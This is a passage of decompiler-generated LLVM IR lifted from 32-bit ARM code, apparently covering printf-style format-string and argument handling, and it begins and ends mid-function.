  store i32 %v5_11634, i32* %r3.global-to-local, align 4
  %v1_11638 = add i32 %v5_11634, 40
  %v2_11638 = inttoptr i32 %v1_11638 to i32*
  %v3_11638 = load i32, i32* %v2_11638, align 4
  store i32 %v3_11638, i32* %r3.global-to-local, align 4
  %v7_1163c = icmp eq i32 %v3_11638, 8
  %v1_11640 = add i32 %v0_1164023, 1
  store i32 %v1_11640, i32* %lr.global-to-local, align 4
  br i1 %v7_1163c, label %dec_label_pc_11708.backedge, label %dec_label_pc_11648

dec_label_pc_11648:                               ; preds = %dec_label_pc_11634
  %v1_11648 = add i32 %v0_1170824, 76
  %v2_11648 = inttoptr i32 %v1_11648 to i32*
  %v3_11648 = load i32, i32* %v2_11648, align 4
  store i32 %v3_11648, i32* %r1.global-to-local, align 4
  %v8_1164c = icmp sgt i32 %v3_11638, 8
  br i1 %v8_1164c, label %dec_label_pc_11670, label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %dec_label_pc_11648
  %v7_11650 = icmp eq i32 %v3_11638, 2
  br i1 %v7_11650, label %dec_label_pc_116c0, label %dec_label_pc_11658

dec_label_pc_11658:                               ; preds = %dec_label_pc_11650
  %v8_11658 = icmp sgt i32 %v3_11638, 2
  br i1 %v8_11658, label %dec_label_pc_11668, label %dec_label_pc_1165c

dec_label_pc_1165c:                               ; preds = %dec_label_pc_11658
  %v1_1165c = icmp slt i32 %v3_11638, 0
  br i1 %v1_1165c, label %dec_label_pc_116f4, label %dec_label_pc_116c0

dec_label_pc_11668:                               ; preds = %dec_label_pc_11658
  %v7_11668 = icmp eq i32 %v3_11638, 7
  br i1 %v7_11668, label %dec_label_pc_116d4, label %dec_label_pc_116f4

dec_label_pc_11670:                               ; preds = %dec_label_pc_11648
  %v7_11670 = icmp eq i32 %v3_11638, 1024
  br i1 %v7_11670, label %dec_label_pc_116c0, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_11670
  %v8_11678 = icmp sgt i32 %v3_11638, 1024
  br i1 %v8_11678, label %dec_label_pc_11690, label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_11678
  switch i32 %v3_11638, label %dec_label_pc_116f4 [
    i32 256, label %dec_label_pc_116c0
    i32 512, label %dec_label_pc_116c0
  ]

dec_label_pc_11690:                               ; preds = %dec_label_pc_11678
  %v7_11690 = icmp eq i32 %v3_11638, 2048
  br i1 %v7_11690, label %dec_label_pc_116a4, label %dec_label_pc_1169c

dec_label_pc_1169c:                               ; preds = %dec_label_pc_11690
  %v1_11698 = load i32, i32* %r4.global-to-local, align 4
  %v9_11698 = icmp eq i32 %v3_11638, %v1_11698
  br i1 %v9_11698, label %dec_label_pc_116d4, label %dec_label_pc_116f4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11690
  %v1_116a4 = add i32 %v3_11648, 7
  %v1_116a8 = and i32 %v1_116a4, -8
  store i32 %v1_116a8, i32* %r3.global-to-local, align 4
  %v1_116ac = inttoptr i32 %v1_116a8 to i32*
  %v2_116ac = load i32, i32* %v1_116ac, align 8
  store i32 %v2_116ac, i32* %r1.global-to-local, align 4
  %v3_116ac = or i32 %v1_116a8, 4
  %v4_116ac = inttoptr i32 %v3_116ac to i32*
  %v5_116ac = load i32, i32* %v4_116ac, align 4
  store i32 %v5_116ac, i32* %r2.global-to-local, align 4
  %v1_116b0 = add i32 %v1_116a8, 8
  store i32 %v1_116b0, i32* %r3.global-to-local, align 4
  store i32 %v1_116b0, i32* %v2_11648, align 4
  %v0_116b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_116b8 = inttoptr i32 %v0_116b8 to i32*
  %v2_116b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116b8, i32* %v1_116b8, align 4
  %v3_116b8 = add i32 %v0_116b8, 4
  %v4_116b8 = inttoptr i32 %v3_116b8 to i32*
  %v5_116b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_116b8, i32* %v4_116b8, align 4
  br label %dec_label_pc_11704

dec_label_pc_116c0:                               ; preds = %dec_label_pc_1167c, %dec_label_pc_1167c, %dec_label_pc_1165c, %dec_label_pc_11670, %dec_label_pc_11650
  %v1_116c0 = inttoptr i32 %v3_11648 to i32*
  %v2_116c0 = load i32, i32* %v1_116c0, align 4
  store i32 %v2_116c0, i32* %r2.global-to-local, align 4
  %v1_116c4 = add i32 %v3_11648, 4
  store i32 %v1_116c4, i32* %r3.global-to-local, align 4
  store i32 %v1_116c4, i32* %v2_11648, align 4
  %v0_116cc = load i32, i32* %r2.global-to-local, align 4
  %v1_116cc = load i32, i32* %ip.global-to-local, align 4
  %v2_116cc = inttoptr i32 %v1_116cc to i32*
  store i32 %v0_116cc, i32* %v2_116cc, align 4
  br label %dec_label_pc_11704

dec_label_pc_116d4:                               ; preds = %dec_label_pc_11668, %dec_label_pc_1169c
  %v3_116d4 = load i32, i32* %v2_11648, align 4
  %v1_116d8 = add i32 %v3_116d4, 7
  %v1_116dc = and i32 %v1_116d8, -8
  store i32 %v1_116dc, i32* %r3.global-to-local, align 4
  %v1_116e0 = inttoptr i32 %v1_116dc to i32*
  %v2_116e0 = load i32, i32* %v1_116e0, align 8
  store i32 %v2_116e0, i32* %r1.global-to-local, align 4
  %v3_116e0 = or i32 %v1_116dc, 4
  %v4_116e0 = inttoptr i32 %v3_116e0 to i32*
  %v5_116e0 = load i32, i32* %v4_116e0, align 4
  store i32 %v5_116e0, i32* %r2.global-to-local, align 4
  %v1_116e4 = add i32 %v1_116dc, 8
  store i32 %v1_116e4, i32* %r3.global-to-local, align 4
  store i32 %v1_116e4, i32* %v2_11648, align 4
  %v0_116ec = load i32, i32* %ip.global-to-local, align 4
  %v1_116ec = inttoptr i32 %v0_116ec to i32*
  %v2_116ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116ec, i32* %v1_116ec, align 4
  %v3_116ec = add i32 %v0_116ec, 4
  %v4_116ec = inttoptr i32 %v3_116ec to i32*
  %v5_116ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_116ec, i32* %v4_116ec, align 4
  br label %dec_label_pc_11704

dec_label_pc_116f4:                               ; preds = %dec_label_pc_1167c, %dec_label_pc_11668, %dec_label_pc_1165c, %dec_label_pc_1169c
  %v1_116f4 = add i32 %v3_11648, 4
  store i32 %v1_116f4, i32* %r3.global-to-local, align 4
  store i32 %v1_116f4, i32* %v2_11648, align 4
  %v0_116fc = load i32, i32* %r1.global-to-local, align 4
  %v1_116fc = inttoptr i32 %v0_116fc to i32*
  %v2_116fc = load i32, i32* %v1_116fc, align 4
  store i32 %v2_116fc, i32* %r3.global-to-local, align 4
  %v1_11700 = load i32, i32* %ip.global-to-local, align 4
  %v2_11700 = inttoptr i32 %v1_11700 to i32*
  store i32 %v2_116fc, i32* %v2_11700, align 4
  br label %dec_label_pc_11704

dec_label_pc_11704:                               ; preds = %dec_label_pc_116d4, %dec_label_pc_116c0, %dec_label_pc_116a4, %dec_label_pc_116f4
  %v0_11704 = load i32, i32* %ip.global-to-local, align 4
  %v1_11704 = add i32 %v0_11704, 8
  store i32 %v1_11704, i32* %ip.global-to-local, align 4
  %v0_1170c.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11708.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11708.backedge

dec_label_pc_11708.backedge:                      ; preds = %dec_label_pc_11704, %dec_label_pc_11634
  %v0_11708 = phi i32 [ %v0_11708.pre, %dec_label_pc_11704 ], [ %v0_1170824, %dec_label_pc_11634 ]
  %v0_11640.be = phi i32 [ %v0_1170c.pre.pre, %dec_label_pc_11704 ], [ %v1_11640, %dec_label_pc_11634 ]
  %v1_11708 = add i32 %v0_11708, 28
  %v2_11708 = inttoptr i32 %v1_11708 to i32*
  %v3_11708 = load i32, i32* %v2_11708, align 4
  store i32 %v3_11708, i32* %r3.global-to-local, align 4
  %v5_11710 = icmp slt i32 %v0_11640.be, %v3_11708
  br i1 %v5_11710, label %dec_label_pc_11634, label %dec_label_pc_11708.dec_label_pc_11714.loopexit_crit_edge

dec_label_pc_11718:                               ; preds = %dec_label_pc_115cc
  br i1 %v6_115e0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11718
  %v2_1171c = add i32 %v0_115cc, 36
  %v3_1171c = inttoptr i32 %v2_1171c to i8*
  %v4_1171c = load i8, i8* %v3_1171c, align 1
  %v5_1171c = zext i8 %v4_1171c to i32
  %v5_11720 = mul nuw nsw i32 %v5_1171c, 8
  %v6_11720 = add i32 %v5_11720, %v0_115cc
  store i32 %v6_11720, i32* %r3.global-to-local, align 4
  %v2_11724 = add i32 %v6_11720, 72
  %v3_11724 = inttoptr i32 %v2_11724 to i32*
  %v4_11724 = load i32, i32* %v3_11724, align 4
  store i32 %v4_11724, i32* %r3.global-to-local, align 4
  store i32 %v4_11724, i32* %v2_115d8, align 4
  %v0_1172c.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11718, %bb
  %v2_11740 = phi i32 [ %v0_1172c.pre, %bb ], [ %v0_115cc, %dec_label_pc_11718 ]
  %v1_1172c = add i32 %v2_11740, 4
  %v2_1172c = inttoptr i32 %v1_1172c to i32*
  %v3_1172c = load i32, i32* %v2_1172c, align 4
  store i32 %v3_1172c, i32* %r3.global-to-local, align 4
  %v6_11730 = icmp eq i32 %v3_1172c, -2147483648
  br i1 %v6_11730, label %bb16, label %dec_label_pc_11714

bb16:                                             ; preds = %.thread1
  %v2_11734 = add i32 %v2_11740, 37
  %v3_11734 = inttoptr i32 %v2_11734 to i8*
  %v4_11734 = load i8, i8* %v3_11734, align 1
  %v5_11734 = zext i8 %v4_11734 to i32
  %v5_11738 = mul nuw nsw i32 %v5_11734, 8
  %v6_11738 = add i32 %v5_11738, %v2_11740
  store i32 %v6_11738, i32* %r3.global-to-local, align 4
  %v2_1173c = add i32 %v6_11738, 72
  %v3_1173c = inttoptr i32 %v2_1173c to i32*
  %v4_1173c = load i32, i32* %v3_1173c, align 4
  store i32 %v4_1173c, i32* %r3.global-to-local, align 4
  store i32 %v4_1173c, i32* %v2_1172c, align 4
  %v0_11744.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11714

dec_label_pc_11708.dec_label_pc_11714.loopexit_crit_edge: ; preds = %dec_label_pc_11708.backedge
  br label %dec_label_pc_11714.loopexit

dec_label_pc_11714.loopexit:                      ; preds = %dec_label_pc_11708.dec_label_pc_11714.loopexit_crit_edge, %dec_label_pc_11628
  %v0_11708.lcssa = phi i32 [ %v0_11708, %dec_label_pc_11708.dec_label_pc_11714.loopexit_crit_edge ], [ %v0_1170817, %dec_label_pc_11628 ]
  br label %dec_label_pc_11714

dec_label_pc_11714:                               ; preds = %dec_label_pc_11714.loopexit, %.thread1, %bb16
  %v1_11764 = phi i32 [ %v0_11708.lcssa, %dec_label_pc_11714.loopexit ], [ %v2_11740, %.thread1 ], [ %v0_11744.pre, %bb16 ]
  %v1_11744 = add i32 %v1_11764, 8
  %v2_11744 = inttoptr i32 %v1_11744 to i32*
  %v3_11744 = load i32, i32* %v2_11744, align 4
  store i32 %v3_11744, i32* %r1.global-to-local, align 4
  %v1_11748 = icmp slt i32 %v3_11744, 0
  br i1 %v1_11748, label %dec_label_pc_11750, label %dec_label_pc_11770

dec_label_pc_11750:                               ; preds = %dec_label_pc_11714
  %v1_11750 = add i32 %v1_11764, 16
  %v2_11750 = inttoptr i32 %v1_11750 to i32*
  %v3_11750 = load i32, i32* %v2_11750, align 4
  %v1_11758 = sub i32 0, %v3_11744
  store i32 %v1_11758, i32* %r1.global-to-local, align 4
  %v1_11754 = and i32 %v3_11750, -10
  %v1_1175c = or i32 %v1_11754, 8
  store i32 %v1_1175c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_11764 = add i32 %v1_11764, 20
  %v3_11764 = inttoptr i32 %v2_11764 to i32*
  store i32 32, i32* %v3_11764, align 4
  %v0_11768 = load i32, i32* %r1.global-to-local, align 4
  %v1_11768 = load i32, i32* @r0, align 4
  %v2_11768 = add i32 %v1_11768, 8
  %v3_11768 = inttoptr i32 %v2_11768 to i32*
  store i32 %v0_11768, i32* %v3_11768, align 4
  %v0_1176c = load i32, i32* %r3.global-to-local, align 4
  %v1_1176c = load i32, i32* @r0, align 4
  %v2_1176c = add i32 %v1_1176c, 16
  %v3_1176c = inttoptr i32 %v2_1176c to i32*
  store i32 %v0_1176c, i32* %v3_1176c, align 4
  %v1_11774.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11770

dec_label_pc_11770:                               ; preds = %dec_label_pc_11714, %dec_label_pc_11750
  %v1_11774 = phi i32 [ %v1_11764, %dec_label_pc_11714 ], [ %v1_11774.pre, %dec_label_pc_11750 ]
  %v2_11770 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11770, i32* @r4, align 4
  ret i32 %v1_11774

; uselistorder directives
  uselistorder i32 %v2_11740, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11640.be, { 1, 0 }
  uselistorder i32 %v0_11708, { 1, 2, 0 }
  uselistorder i32 %v3_11648, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_11648, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_11638, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_1164023, { 1, 0 }
  uselistorder i32 %v0_1170824, { 0, 2, 1 }
  uselistorder i32 %v0_1170817, { 2, 0, 1 }
  uselistorder i32 %v0_115cc, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_11770, { 1, 0 }
  uselistorder label %dec_label_pc_11714, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11704, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_116f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_116d4, { 1, 0 }
  uselistorder label %dec_label_pc_116c0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11634, { 1, 0 }
  uselistorder label %dec_label_pc_11628, { 1, 0 }
  uselistorder label %dec_label_pc_11600, { 1, 0 }
}

define i32 @function_1177c() local_unnamed_addr {
dec_label_pc_1177c:
  %v1_11798.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_117a0, %dec_label_pc_1177c
  %v0_11794 = phi i32 [ %v1_11794, %dec_label_pc_117a0 ], [ ptrtoint (i32* @global_var_1a6ee.221 to i32), %dec_label_pc_1177c ]
  %v1_11794 = add i32 %v0_11794, -2
  %v2_11794 = inttoptr i32 %v1_11794 to i16*
  %v3_11794 = load i16, i16* %v2_11794, align 2
  %v4_11794 = sext i16 %v3_11794 to i32
  store i32 %v1_11794, i32* @ip, align 4
  %v9_11798 = icmp eq i32 %v4_11794, %v1_11798.pre
  br i1 %v9_11798, label %dec_label_pc_11794.dec_label_pc_117a8_crit_edge, label %dec_label_pc_117a0

dec_label_pc_11794.dec_label_pc_117a8_crit_edge:  ; preds = %dec_label_pc_11794
  br label %dec_label_pc_117a8

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11794
  %tmp = icmp ugt i32 %v1_11794, ptrtoint (i32* @global_var_1a6d6.220 to i32)
  br i1 %tmp, label %dec_label_pc_11794, label %dec_label_pc_117a8.loopexit

dec_label_pc_117a8.loopexit:                      ; preds = %dec_label_pc_117a0
  br label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_117a8.loopexit, %dec_label_pc_11794.dec_label_pc_117a8_crit_edge
  %v2_117b8.pre-phi = sub i32 %v1_11794, ptrtoint (i32* @global_var_1a6d6.220 to i32)
  store i32 %v2_117b8.pre-phi, i32* @r2, align 4
  %v4_117bc = sdiv i32 %v2_117b8.pre-phi, 2
  %v5_117bc = add i32 %v4_117bc, ptrtoint (i32* @global_var_1a6ee.221 to i32)
  %v6_117bc = inttoptr i32 %v5_117bc to i8*
  %v7_117bc = load i8, i8* %v6_117bc, align 1
  %v9_117bc = zext i8 %v7_117bc to i32
  ret i32 %v9_117bc

; uselistorder directives
  uselistorder i32 %v2_117b8.pre-phi, { 1, 0 }
  uselistorder i32 %v1_11794, { 0, 1, 3, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1a6ee.221 to i32), { 1, 0 }
}

define i32 @function_117d0(i8* %arg1) local_unnamed_addr {
dec_label_pc_117d0:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_117d0 = load i32, i32* @r4, align 4
  store i32 %v3_117d0, i32* %stack_var_-36, align 4
  %v6_117d0 = load i32, i32* @r5, align 4
  %v27_117d0 = load i32, i32* @lr, align 4
  %v0_117d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_117d4 = add i32 %v0_117d4, 16
  %v2_117d4 = inttoptr i32 %v1_117d4 to i32*
  %v3_117d4 = load i32, i32* %v2_117d4, align 4
  %v1_117dc = and i32 %v3_117d4, 128
  store i32 %v1_117dc, i32* @r4, align 4
  %v2_117dc = icmp eq i32 %v1_117dc, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_117d4, i32* %r7.global-to-local, align 4
  store i32 144312, i32* @lr, align 4
  %v1_11804 = add i32 %v0_117d4, 24
  %v2_11804 = inttoptr i32 %v1_11804 to i32*
  %v3_11804 = load i32, i32* %v2_11804, align 4
  store i32 %v3_11804, i32* %fp.global-to-local, align 4
  br i1 %v2_117dc, label %.dec_label_pc_11858_crit_edge, label %dec_label_pc_11810

.dec_label_pc_11858_crit_edge:                    ; preds = %dec_label_pc_117d0
  %v2_11808 = inttoptr i32 %v0_117d4 to i32*
  %v3_11808 = load i32, i32* %v2_11808, align 4
  store i32 %v3_11808, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_11858

dec_label_pc_11810:                               ; preds = %dec_label_pc_117d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_11820 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_11814

dec_label_pc_11814:                               ; preds = %dec_label_pc_11844.dec_label_pc_11814_crit_edge, %dec_label_pc_11810
  %v1_11824 = phi i32 [ %v1_11834, %dec_label_pc_11844.dec_label_pc_11814_crit_edge ], [ 0, %dec_label_pc_11810 ]
  %v0_11814 = phi i32 [ %v0_11814.pre, %dec_label_pc_11844.dec_label_pc_11814_crit_edge ], [ %v0_117d4, %dec_label_pc_11810 ]
  %v1_11814 = inttoptr i32 %v0_11814 to i32*
  %v2_11814 = load i32, i32* %v1_11814, align 4
  %v4_11818 = mul i32 %v1_11824, 4
  %v5_11818 = add i32 %v2_11814, %v4_11818
  store i32 %v5_11818, i32* %r3.global-to-local, align 4
  %v1_1181c = add i32 %v5_11818, -4
  %v2_1181c = inttoptr i32 %v1_1181c to i8*
  %v3_1181c = load i8, i8* %v2_1181c, align 1
  %v4_1181c = zext i8 %v3_1181c to i32
  store i32 %v4_1181c, i32* %r1.global-to-local, align 4
  store i32 %v2_11820, i32* @ip, align 4
  %v2_11824 = add i32 %v1_11824, %v2_11820
  store i32 %v2_11824, i32* %r2.global-to-local, align 4
  %v3_11828 = add i32 %v2_11824, -72
  %v4_11828 = inttoptr i32 %v3_11828 to i8*
  store i8 %v3_1181c, i8* %v4_11828, align 1
  %v0_1182c = load i32, i32* %r3.global-to-local, align 4
  %v1_1182c = add i32 %v0_1182c, -4
  %v2_1182c = inttoptr i32 %v1_1182c to i32*
  %v3_1182c = load i32, i32* %v2_1182c, align 4
  store i32 %v3_1182c, i32* %r3.global-to-local, align 4
  %v0_11830 = load i32, i32* %r1.global-to-local, align 4
  %v9_11830 = icmp eq i32 %v0_11830, %v3_1182c
  %v0_11834 = load i32, i32* %r0.global-to-local, align 4
  %v1_11834 = add i32 %v0_11834, 1
  store i32 %v1_11834, i32* %r0.global-to-local, align 4
  br i1 %v9_11830, label %dec_label_pc_1183c, label %dec_label_pc_11d00

dec_label_pc_1183c:                               ; preds = %dec_label_pc_11814
  %v2_1183c = icmp eq i32 %v3_1182c, 0
  br i1 %v2_1183c, label %dec_label_pc_1184c, label %dec_label_pc_11844

dec_label_pc_11844:                               ; preds = %dec_label_pc_1183c
  %tmp180 = icmp ult i32 %v1_11834, 32
  br i1 %tmp180, label %dec_label_pc_11844.dec_label_pc_11814_crit_edge, label %dec_label_pc_1184c

dec_label_pc_11844.dec_label_pc_11814_crit_edge:  ; preds = %dec_label_pc_11844
  %v0_11814.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11814

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11844, %dec_label_pc_1183c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11854 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_11854, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %.dec_label_pc_11858_crit_edge, %dec_label_pc_1184c
  %v3_1188c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_11858_crit_edge ], [ %v2_11820, %dec_label_pc_1184c ]
  %v0_1188462 = phi i32 [ %v3_11808, %.dec_label_pc_11858_crit_edge ], [ %v2_11854, %dec_label_pc_1184c ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 216, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1a714.226 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a714.226, i32 0, i32 0), i8** %stack_var_-120, align 4
  br label %dec_label_pc_11884

dec_label_pc_11880:                               ; preds = %.thread19, %dec_label_pc_119b4
  %v0_11880 = phi i32 [ %v2_11a2c, %.thread19 ], [ %v0_1199074, %dec_label_pc_119b4 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread19 ], [ %stack_var_-44.2, %dec_label_pc_119b4 ]
  store i32 %v0_11880, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11884

dec_label_pc_11884:                               ; preds = %dec_label_pc_11858, %dec_label_pc_11880
  %v1_11898 = phi i32 [ %v0_1188462, %dec_label_pc_11858 ], [ %v0_11880, %dec_label_pc_11880 ]
  %stack_var_-44.1 = phi i32 [ %tmp115, %dec_label_pc_11858 ], [ %stack_var_-44.0, %dec_label_pc_11880 ]
  %v1_11884 = inttoptr i32 %v1_11898 to i8*
  %v2_11884 = load i8, i8* %v1_11884, align 1
  %v3_11884 = zext i8 %v2_11884 to i32
  store i32 %v3_11884, i32* %r3.global-to-local, align 4
  %v7_11888 = icmp eq i8 %v2_11884, 42
  br i1 %v7_11888, label %bb, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11884
  store i32 %v1_11898, i32* %r6.global-to-local, align 4
  %v0_1189c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1189c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_118e4.preheader

bb:                                               ; preds = %dec_label_pc_11884
  %v1_11890 = load i32, i32* %r8.global-to-local, align 4
  %v2_11890 = load i32, i32* %sb.global-to-local, align 4
  %v4_11890 = mul i32 %v2_11890, %v1_11890
  %v5_11890 = add i32 %v4_11890, %v3_1188c.pre-phi
  store i32 %v5_11890, i32* %r3.global-to-local, align 4
  %v2_11898 = add i32 %v1_11898, 1
  store i32 %v2_11898, i32* %r6.global-to-local, align 4
  %v0_1189c109 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1189c109, i32* %r1.global-to-local, align 4
  %v3_118a0 = add i32 %v5_11890, -40
  %v4_118a0 = inttoptr i32 %v3_118a0 to i32*
  store i32 %v0_1189c109, i32* %v4_118a0, align 4
  %v0_118e8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118e4.preheader

dec_label_pc_118e4.preheader:                     ; preds = %.thread7, %bb
  %v0_118e8.pre = phi i32 [ %v1_11898, %.thread7 ], [ %v0_118e8.pre.pre, %bb ]
  %v0_118ec.pre = load i32, i32* @lr, align 4
  %v2_118ec = add i32 %v0_118ec.pre, 216
  %v3_118ec = inttoptr i32 %v2_118ec to i32*
  br label %dec_label_pc_118e4

dec_label_pc_118a8:                               ; preds = %dec_label_pc_118e4
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_118ac = load i32, i32* %r1.global-to-local, align 4
  %v2_118ac = add i32 %v0_118ac, -214748363
  %tmp137 = sub i32 214748362, %v0_118ac
  %v6_118ac = and i32 %tmp137, %v0_118ac
  %v7_118ac = icmp slt i32 %v6_118ac, 0
  %v8_118ac = icmp slt i32 %v2_118ac, 0
  %v9_118ac = icmp eq i32 %v0_118ac, 214748363
  %v3_118b0 = xor i1 %v8_118ac, %v7_118ac
  %v4_118b0 = or i1 %v9_118ac, %v3_118b0
  br i1 %v4_118b0, label %dec_label_pc_118c8, label %dec_label_pc_118b4

dec_label_pc_118b4:                               ; preds = %dec_label_pc_118a8
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_118b8 = icmp eq i32 %v0_118ac, 214748364
  br i1 %v9_118b8, label %dec_label_pc_118c0, label %dec_label_pc_118e0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_118b4
  %v8_118c4 = icmp ugt i8 %v2_118e8, 55
  br i1 %v8_118c4, label %dec_label_pc_118e0, label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118c0, %dec_label_pc_118a8
  %v2_118cc = mul i32 %v0_118ac, 10
  %v1_118d0 = add i32 %v2_118cc, -48
  store i32 %v1_118d0, i32* %r3.global-to-local, align 4
  %v2_118d4 = add i32 %v1_118d0, %v3_118e8
  br label %dec_label_pc_118e0

dec_label_pc_118e0:                               ; preds = %dec_label_pc_118c0, %dec_label_pc_118b4, %dec_label_pc_118c8
  %storemerge = phi i32 [ %v2_118d4, %dec_label_pc_118c8 ], [ 2147483647, %dec_label_pc_118b4 ], [ 2147483647, %dec_label_pc_118c0 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_118e0 = add i32 %v0_11968, 1
  store i32 %v1_118e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118e4.preheader, %dec_label_pc_118e0
  %v0_11968 = phi i32 [ %v0_118e8.pre, %dec_label_pc_118e4.preheader ], [ %v1_118e0, %dec_label_pc_118e0 ]
  store i32 216, i32* %r2.global-to-local, align 4
  %v1_118e8 = inttoptr i32 %v0_11968 to i8*
  %v2_118e8 = load i8, i8* %v1_118e8, align 1
  %v3_118e8 = zext i8 %v2_118e8 to i32
  store i32 %v3_118e8, i32* @ip, align 4
  %v4_118ec = load i32, i32* %v3_118ec, align 4
  store i32 %v4_118ec, i32* %r3.global-to-local, align 4
  %v2_118f0 = mul nuw nsw i32 %v3_118e8, 2
  store i32 %v2_118f0, i32* %r2.global-to-local, align 4
  %v2_118f4 = add i32 %v2_118f0, %v4_118ec
  %v3_118f4 = inttoptr i32 %v2_118f4 to i16*
  %v4_118f4 = load i16, i16* %v3_118f4, align 2
  %v6_118f4 = zext i16 %v4_118f4 to i32
  store i32 %v6_118f4, i32* %r3.global-to-local, align 4
  %v1_118f8 = and i32 %v6_118f4, 8
  %v2_118f8 = icmp eq i32 %v1_118f8, 0
  br i1 %v2_118f8, label %dec_label_pc_11900, label %dec_label_pc_118a8

dec_label_pc_11900:                               ; preds = %dec_label_pc_118e4
  %v0_11900 = load i32, i32* %r0.global-to-local, align 4
  %v1_11900 = add i32 %v0_11900, -1
  %v2_11900 = inttoptr i32 %v1_11900 to i8*
  %v3_11900 = load i8, i8* %v2_11900, align 1
  %v4_11900 = zext i8 %v3_11900 to i32
  store i32 %v4_11900, i32* %r3.global-to-local, align 4
  %v7_11904 = icmp eq i8 %v3_11900, 37
  br i1 %v7_11904, label %dec_label_pc_1190c, label %dec_label_pc_119cc

dec_label_pc_1190c:                               ; preds = %dec_label_pc_11900
  %v7_1190c = icmp eq i8 %v2_118e8, 36
  %. = zext i1 %v7_1190c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_11918 = load i32, i32* %r1.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_11918, 1
  br i1 %tmp141, label %bb142, label %thread-pre-split

bb142:                                            ; preds = %dec_label_pc_1190c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

